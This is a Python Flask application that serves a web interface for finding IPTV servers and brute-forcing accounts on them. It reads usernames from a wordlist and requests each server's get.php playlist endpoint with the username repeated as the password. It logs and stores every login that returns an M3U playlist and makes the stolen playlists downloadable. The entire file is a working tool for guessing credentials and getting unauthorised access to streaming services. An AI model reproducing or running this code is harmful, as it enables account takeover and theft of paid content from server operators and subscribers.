import os
import random
import threading
import logging
import time
from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_cors import CORS
import Crawler

# Configure standard Python logger for Docker/Portainer stdout logs
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s in %(module)s: %(message)s'
)
logger = logging.getLogger("IPTV")

app = Flask(__name__)
CORS(app)

crawler = Crawler.Crawler("it")

# Global found accounts store
found_accounts_list = []

scan_state = {
    "is_scanning": False,
    "progress": 0,
    "total": 0,
    "current_url": "",
    "status_message": "Idle",
    "found_accounts": 0,
    "eta_seconds": 0,
    "elapsed_seconds": 0,
    "logs": []
}

def log_event(message, to_console=False):
    scan_state["logs"].append(message)
    if len(scan_state["logs"]) > 200:
        scan_state["logs"].pop(0)
    if to_console:
        logger.info(message)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/status", methods=["GET"])
def get_status():
    return jsonify({
        "version": crawler.version,
        "language": crawler.language,
        "parsed_urls": crawler.parsedUrls,
        "scan_state": scan_state,
        "found_accounts_list": found_accounts_list
    })

@app.route("/api/add-url", methods=["POST"])
def add_url():
    data = request.json or {}
    url = data.get("url", "").strip()
    if crawler.add_custom_url(url):
        log_event(f"Manually added target server: {url}", to_console=True)
        return jsonify({"success": True, "message": f"Added {url}", "parsed_urls": crawler.parsedUrls})
    return jsonify({"success": False, "message": "Invalid or duplicate URL"}), 400

@app.route("/api/search-links", methods=["POST"])
def search_links():
    data = request.json or {}
    query = data.get("query", "").strip() or None

    def do_search():
        msg = "Searching web for IPTV server URLs..."
        scan_state["status_message"] = msg
        log_event(msg, to_console=True)
        found = crawler.search_links(query)
        msg_complete = f"Search complete. Discovered {found} new servers. Total available: {len(crawler.parsedUrls)}"
        scan_state["status_message"] = msg_complete
        log_event(msg_complete, to_console=True)

    thread = threading.Thread(target=do_search)
    thread.start()
    return jsonify({"status": "Search started"})

@app.route("/api/change-language", methods=["POST"])
def change_language():
    data = request.json or {}
    lang = data.get("language", "it")
    success = crawler.change_language(lang)
    if success:
        log_event(f"Language changed to {lang}.txt", to_console=True)
        return jsonify({"success": True, "language": crawler.language, "message": f"Language set to {lang}"})
    else:
        return jsonify({"success": False, "message": f"Language file for {lang} not found"}), 400

@app.route("/api/scan", methods=["POST"])
def start_scan():
    if scan_state["is_scanning"]:
        return jsonify({"error": "Scan already in progress"}), 400

    data = request.json or {}
    url = data.get("url")

    def run_scan():
        scan_state["is_scanning"] = True
        scan_state["progress"] = 0
        scan_state["found_accounts"] = 0
        scan_state["eta_seconds"] = 0
        scan_state["elapsed_seconds"] = 0
        
        target_url = url if url else (random.choice(crawler.parsedUrls) if crawler.parsedUrls else None)
        if not target_url:
            scan_state["is_scanning"] = False
            msg = "No server URLs available. Run search or add a server URL."
            scan_state["status_message"] = msg
            log_event(msg, to_console=True)
            return

        scan_state["current_url"] = target_url
        msg_start = f"Starting scan on target: {target_url}"
        scan_state["status_message"] = f"Scanning {target_url}..."
        log_event(msg_start, to_console=True)

        lang_file = os.path.join(crawler.languageDir, crawler.language + ".txt")
        if not os.path.exists(lang_file):
            scan_state["is_scanning"] = False
            scan_state["status_message"] = "Language file missing."
            log_event("Error: Language file missing.", to_console=True)
            return

        with open(lang_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if line.strip()]

        total_lines = len(lines)
        scan_state["total"] = total_lines
        found = 0
        start_time = time.time()

        headers = {'User-Agent': 'Mozilla/5.0'}
        import requests
        for idx, username in enumerate(lines, start=1):
            scan_state["progress"] = idx
            
            elapsed = time.time() - start_time
            scan_state["elapsed_seconds"] = int(elapsed)
            if idx > 1:
                avg_time_per_item = elapsed / idx
                remaining_items = total_lines - idx
                scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)

            log_event(f"request for name: {username}", to_console=False)
            
            if idx % 25 == 0 or idx == total_lines:
                logger.info(f"Scan progress on {target_url}: {idx}/{total_lines} ({round((idx/total_lines)*100)}%) - Accounts found: {found} - ETA: {scan_state['eta_seconds']}s")

            target = target_url + crawler.basicString % (username, username)
            try:
                res = requests.get(target, headers=headers, timeout=4)
                if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
                    domain = target_url.replace("http://", "").replace("https://", "").strip("/")
                    new_path = os.path.join(crawler.outputDir, domain)
                    crawler.create_file(username, new_path, res.text)
                    found += 1
                    scan_state["found_accounts"] = found
                    
                    m3u_file_path = os.path.join(domain, f"tv_channels_{username}.m3u").replace("\\", "/")
                    playlist_url = f"{target_url}/get.php?username={username}&password={username}&type=m3u&output=mpegts"
                    
                    account_data = {
                        "server": target_url,
                        "username": username,
                        "password": username,
                        "file_path": m3u_file_path,
                        "playlist_url": playlist_url
                    }
                    found_accounts_list.append(account_data)

                    msg_found = f"ACCOUNT FOUND !!! -> Username: '{username}' | Password: '{username}' | Server: '{target_url}' | Saved file: '{m3u_file_path}'"
                    log_event(msg_found, to_console=True)
            except Exception:
                pass

        if target_url in crawler.parsedUrls:
            crawler.parsedUrls.remove(target_url)

        scan_state["is_scanning"] = False
        scan_state["eta_seconds"] = 0
        msg_done = f"Scan completed for {target_url}. Total accounts found: {found}"
        scan_state["status_message"] = msg_done
        log_event(msg_done, to_console=True)

    thread = threading.Thread(target=run_scan)
    thread.start()
    return jsonify({"status": "Scan started"})

@app.route("/api/outputs", methods=["GET"])
def list_outputs():
    outputs = []
    out_dir = crawler.outputDir
    if os.path.exists(out_dir):
        for root, dirs, files in os.walk(out_dir):
            for file in files:
                if file.endswith(".m3u"):
                    rel_path = os.path.relpath(os.path.join(root, file), out_dir)
                    outputs.append({
                        "filename": file,
                        "path": rel_path.replace("\\", "/")
                    })
    return jsonify({"files": outputs})

@app.route("/api/download/<path:filepath>")
def download_file(filepath):
    return send_from_directory(crawler.outputDir, filepath, as_attachment=True)

def main():
    logger.info("Starting IPTV Web Server on port 5000...")
    app.run(host="0.0.0.0", port=5000, debug=False)

if __name__ == "__main__":
    main()
else:
    main()
